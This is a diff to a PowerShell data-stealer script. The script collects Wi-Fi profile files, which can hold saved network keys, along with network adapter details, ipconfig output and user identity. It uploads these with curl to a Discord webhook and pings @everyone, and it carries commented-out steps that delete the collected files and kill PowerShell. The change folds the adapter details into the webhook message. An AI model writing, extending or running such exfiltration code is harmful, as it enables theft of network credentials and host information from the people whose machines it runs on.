@@ -26,19 +26,14 @@ Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
 }
 
 
-$netInfoFile = Join-Path $e "netinfo.txt"
-
-Get-NetAdapter | ForEach-Object {
+$netInfoText = Get-NetAdapter | ForEach-Object {
     $i = $_
     $ips = Get-NetIPAddress -InterfaceIndex $i.ifIndex -ErrorAction SilentlyContinue
-    [pscustomobject]@{
-        Name = $i.Name
-        Type = $i.InterfaceDescription
-        MAC  = $i.MacAddress
-        IPv4 = ($ips | Where-Object AddressFamily -eq IPv4 | Select-Object -Expand IPAddress -ErrorAction Ignore) -join ', '
-        IPv6 = ($ips | Where-Object AddressFamily -eq IPv6 | Select-Object -Expand IPAddress -ErrorAction Ignore) -join ', '
-    }
-} | Format-Table -AutoSize | Out-File $netInfoFile
+    $ipv4 = ($ips | Where-Object AddressFamily -eq IPv4 | Select-Object -Expand IPAddress -ErrorAction Ignore) -join ', '
+    $ipv6 = ($ips | Where-Object AddressFamily -eq IPv6 | Select-Object -Expand IPAddress -ErrorAction Ignore) -join ', '
+    "$($i.Name) [$($i.InterfaceDescription)]`nMAC: $($i.MacAddress)`nIPv4: $ipv4`nIPv6: $ipv6`n"
+} -join "`n"
+
 
 
 ipconfig /all | Out-File "$e\ipcfg.txt"
@@ -47,7 +42,7 @@ ipconfig /all | Out-File "$e\ipcfg.txt"
 
 # Send to discord
 
-$content = "$($whoami_content) | @everyone"
+$content = "$($whoami_content)| \n $netInfoText | @everyone"
 
 Write-Output "about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt, $netInfoFile"
 
@@ -58,7 +53,7 @@ curl.exe -X POST $wh `
     -F "file1=@$zip" `
     -F "file2=@$wifiFile" `
     -F "file3=@$e\ipcfg.txt" `
-    -F "file4=@$netInfoFile"
+
 
 Write-Output sent to discord
 # cleanup
@@ -66,7 +61,7 @@ Write-Output sent to discord
 #Remove-Item -Path "$wifiFile" -Force
 #Remove-Item -Path "$e\ipcfg.txt" -Force
 #Remove-Item -Path "$zip" -Force
-#Remove-Item -Path "$netInfoFile" -Force
+
 
 #exit quickly
 #taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
